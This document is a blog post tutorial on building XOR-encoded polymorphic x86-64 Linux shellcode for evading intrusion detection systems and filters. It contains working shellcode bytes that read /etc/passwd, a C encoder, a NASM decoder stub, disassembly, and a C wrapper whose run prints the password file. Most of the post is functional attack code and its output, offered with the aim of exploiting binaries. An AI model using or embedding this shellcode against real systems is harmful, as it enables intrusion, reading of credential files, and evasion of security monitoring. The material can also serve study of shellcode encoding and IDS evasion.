---
layout: post
title: "Polymorphic shellcode"
categories: [shellcode]
tags: [shellcode]
description: How to make a polymorphic shellcode on a Linux system to bypass Network Intrusion Detection Systems.
---

# 1. Surroundings
```bash
$ uname -a
Linux debian 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u2 (2017-03-07) x86_64 GNU/Linux

$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.7 (jessie)
Release:	8.7
Codename:	jessie

$ gcc --version
gcc (Debian 4.9.2-10) 4.9.2

$ nasm -v
NASM version 2.11.05 compiled on Sep  9 2014

$ ld --version
GNU ld (GNU Binutils for Debian) 2.25
```

# 2. Explanation
For the second post of the shellcode serie, I will show you the polymorphic shellcode method.
This method has lots of advantages. For example, the encoded shellcode can contain null bytes, she is very easy to implement and also very powerfull to bypass IDS and filters. The shellcode is composed of two parts:
```bash
+--------------------+-------------------+
|                    |                   |
|      DECODER       | ENCODED SHELLCODE |
|                    |                   |
+--------------------+-------------------+
```

As you can see, we will first have the decoder and the encoded shellcode. The aim is first to decode the encoded shellcode thanks to the decoder and then jump on the decoded shellcode to execute code. The operations uses to encoded/decoded the shellcode can be very different, like addition, subtraction, xor, etc. For this post, I have choose the xor algorithm with a very basic key. This shellcode is not the most optimized.

# 3. Shellcode writting
We first need a shellcode to XOR it. I've choose the one of [my previous article](/shellcode/2017/05/28/basic_shellcode.html). To XOR the shellcode, I choose the byte 0x69. This his key is very basic for two reason:

- First because it impact the final shellcode length.

- Second because the next encoded shellcode don't contain this byte. (cf: 1^1 = 0 so null byte)

Let's encoded the shellcode:
```bash
$ cat xor.c
#include <stdio.h>

unsigned char shellcode[] = "\xeb\x39\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x8d\x34\x24\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\xb7\x01\x48\x89\xc2\x48\x31\xc0\xb0\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x0f\x05\xe8\xc2\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41";

int main(void) {

  for (int i = 0; shellcode[i]; i++) {
    printf("0x%02x,", shellcode[i] ^ 0x69);
  }
  printf("\n");
  return 0;
}

$ gcc xor.c -o xor -std=c99

$ ./xor 
0x82,0x50,0x36,0xe9,0x1e,0x62,0x28,0x21,0x58,0xa9,0x6d,0x6b,0x21,0x58,0x9f,0x66,0x6c,0x21,0xe0,0xae,0x21,0xe4,0x5d,0x4d,0x21,0x58,0xbb,0x0f,0xd3,0x96,0x66,0x21,0x58,0xa9,0x66,0x6c,0x21,0x58,0x96,0x29,0xde,0x68,0x21,0xe0,0xab,0x21,0x58,0xa9,0xd9,0x68,0x66,0x6c,0x21,0x58,0xa9,0xd9,0x55,0x66,0x6c,0x81,0xab,0x96,0x96,0x96,0x46,0x0c,0x1d,0x0a,0x46,0x19,0x08,0x1a,0x1a,0x1e,0x0d,0x28,
```

It's ok for the encoded shellcode part. Now we will do the decoder. It will be a basic loop which will iterate all over the encoded shellcode, XOR every bytes and then jump on the decoded shellcode.
```nasm
_start:
	jmp L1
L2:
	pop rsi                      ; First pop "shell" value to RSI
	xor rcx, rcx
	mov cl, 0x4c                 ; Move "shell" length (76) to cl
L3:
	xor byte [rsi+rcx], 0x69     ; XOR the "shell" byte with the key
	sub cl, 1                    ; Substracte the "shell" length of 1
	jnz L3                       ; Loop if cl is none zero
	xor byte [rsi+rcx], 0x69     ; XOR the last byte
	jmp L4                       ; Jump on the decoded shellcode
L1:
	call L2
L4:
shell:	db 0x82,0x50,0x36,0xe9,0x1e,0x62,0x28,0x21,0x58,0xa9,0x6d,0x6b,0x21,0x58,0x9f,0x66,0x6c,0x21,0xe0,0xae,0x21,0xe4,0x5d,0x4d,0x21,0x58,0xbb,0x0f,0xd3,0x96,0x66,0x21,0x58,0xa9,0x66,0x6c,0x21,0x58,0x96,0x29,0xde,0x68,0x21,0xe0,0xab,0x21,0x58,0xa9,0xd9,0x68,0x66,0x6c,0x21,0x58,0xa9,0xd9,0x55,0x66,0x6c,0x81,0xab,0x96,0x96,0x96,0x46,0x0c,0x1d,0x0a,0x46,0x19,0x08,0x1a,0x1a,0x1e,0x0d,0x28
```

And now the shellcode is ready to pown binary's!

# 4. The shellcode
The final shellcode is on the last schema, now we can assemble it, compile it and check null-bytes:
```bash
$ nasm -f elf64 polymorphic.s -o polymorphic.o

$ ld polymorphic.o -o polymorphic             
ld: warning: cannot find entry symbol _start; defaulting to 0000000000400080

$ objdump -d polymorphic        

polymorphic:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	eb 15                	jmp    400097 <L1>

0000000000400082 <L2>:
  400082:	5e                   	pop    %rsi
  400083:	48 31 c9             	xor    %rcx,%rcx
  400086:	b1 4c                	mov    $0x4c,%cl

0000000000400088 <L3>:
  400088:	80 34 0e 69          	xorb   $0x69,(%rsi,%rcx,1)
  40008c:	80 e9 01             	sub    $0x1,%cl
  40008f:	75 f7                	jne    400088 <L3>
  400091:	80 34 0e 69          	xorb   $0x69,(%rsi,%rcx,1)
  400095:	eb 05                	jmp    40009c <L4>

0000000000400097 <L1>:
  400097:	e8 e6 ff ff ff       	callq  400082 <L2>

000000000040009c <L4>:
  40009c:	82                   	(bad)  
  40009d:	50                   	push   %rax
  40009e:	36 e9 1e 62 28 21    	ss jmpq 216862c2 <__bss_start+0x210852c2>
  4000a4:	58                   	pop    %rax
  4000a5:	a9 6d 6b 21 58       	test   $0x58216b6d,%eax
  4000aa:	9f                   	lahf   
  4000ab:	66 6c                	data16 insb (%dx),%es:(%rdi)
  4000ad:	21 e0                	and    %esp,%eax
  4000af:	ae                   	scas   %es:(%rdi),%al
  4000b0:	21 e4                	and    %esp,%esp
  4000b2:	5d                   	pop    %rbp
  4000b3:	4d 21 58 bb          	and    %r11,-0x45(%r8)
  4000b7:	0f d3 96 66 21 58 a9 	psrlq  -0x56a7de9a(%rsi),%mm2
  4000be:	66 6c                	data16 insb (%dx),%es:(%rdi)
  4000c0:	21 58 96             	and    %ebx,-0x6a(%rax)
  4000c3:	29 de                	sub    %ebx,%esi
  4000c5:	68 21 e0 ab 21       	pushq  $0x21abe021
  4000ca:	58                   	pop    %rax
  4000cb:	a9 d9 68 66 6c       	test   $0x6c6668d9,%eax
  4000d0:	21 58 a9             	and    %ebx,-0x57(%rax)
  4000d3:	d9 55 66             	fsts   0x66(%rbp)
  4000d6:	6c                   	insb   (%dx),%es:(%rdi)
  4000d7:	81 ab 96 96 96 46 0c 	subl   $0x460a1d0c,0x46969696(%rbx)
  4000de:	1d 0a 46 
  4000e1:	19 08                	sbb    %ecx,(%rax)
  4000e3:	1a 1a                	sbb    (%rdx),%bl
  4000e5:	1e                   	(bad)  
  4000e6:	0d                   	.byte 0xd
  4000e7:	28                   	.byte 0x28
```

Everything might be correct.

# 5. Demonstration
And the final C wrapper to test the shellcode:
```c
#include <stdio.h>
#include <string.h>

char shellcode[] = "\xeb\x15\x5e\x48\x31\xc9\xb1\x4c\x80\x34\x0e\x69\x80\xe9\x01\x75\xf7\x80\x34\x0e\x69\xeb\x05\xe8\xe6\xff\xff\xff\x82\x50\x36\xe9\x1e\x62\x28\x21\x58\xa9\x6d\x6b\x21\x58\x9f\x66\x6c\x21\xe0\xae\x21\xe4\x5d\x4d\x21\x58\xbb\x0f\xd3\x96\x66\x21\x58\xa9\x66\x6c\x21\x58\x96\x29\xde\x68\x21\xe0\xab\x21\x58\xa9\xd9\x68\x66\x6c\x21\x58\xa9\xd9\x55\x66\x6c\x81\xab\x96\x96\x96\x46\x0c\x1d\x0a\x46\x19\x08\x1a\x1a\x1e\x0d\x28";

int main(void) {
  printf("Shellcode length: %d\n", strlen(shellcode));
  (*(void (*)()) shellcode)();
  return 0;
}
```

We can now compile it and test it:
```bash
$ gcc wrapper.c -z execstack

$ ./a.out 
Shellcode length: 104
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
...
```

Done.
